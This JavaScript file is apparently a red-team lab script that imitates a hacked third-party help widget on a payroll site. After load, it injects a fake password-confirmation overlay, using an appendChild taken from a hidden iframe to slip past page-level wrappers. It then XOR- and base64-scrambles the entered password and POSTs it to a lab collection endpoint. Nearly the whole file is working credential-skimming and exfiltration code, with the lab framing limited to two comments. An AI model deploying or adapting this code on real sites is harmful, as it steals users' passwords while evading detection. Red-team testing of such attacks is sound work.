// Lab attack, modelled on red-team scenario e14: a help/chat widget on a genuine payroll
// site, whose vendor was hacked, asks for the password again a second after load.
// Drawn with an appendChild taken from a fresh frame, to get around anything that
// wraps the page's own appendChild.
var frame = document.createElement("iframe");
frame.style.display = "none";
document.documentElement.appendChild(frame);
var clean = frame.contentWindow.Node.prototype.appendChild;
// Reads the password, closes the prompt, then sends it scrambled (XOR + base64) to the
// widget vendor's own server, so the send itself is not recognisable.
function steal(value, shade) {
  shade.remove();
  var out = "";
  for (var i = 0; i < value.length; i++) out += String.fromCharCode(value.charCodeAt(i) ^ 23);
  setTimeout(function () {
    fetch("http://helpwidget.localhost:8765/collect", {method: "POST", body: btoa(out)});
  }, 300);
}
function draw() {
  var shade = document.createElement("div");
  shade.id = "reauth";
  shade.style.cssText = "position:fixed;inset:0;background:#0007;display:flex;align-items:center;justify-content:center";
  var box = document.createElement("div");
  box.style.cssText = "background:#fff;padding:24px;border-radius:10px;width:320px;font:15px system-ui";
  var text = document.createElement("p");
  text.textContent = "For your security, confirm your password to view pay statements.";
  var field = document.createElement("input");
  field.type = "password";
  field.id = "rp";
  var go = document.createElement("button");
  go.id = "rp-go";
  go.textContent = "Continue";
  go.onclick = function () { steal(field.value, shade); };
  box.append(text, field, go);
  shade.appendChild(box);
  clean.call(document.body, shade);
}
window.addEventListener("load", function () { setTimeout(draw, 1000); });
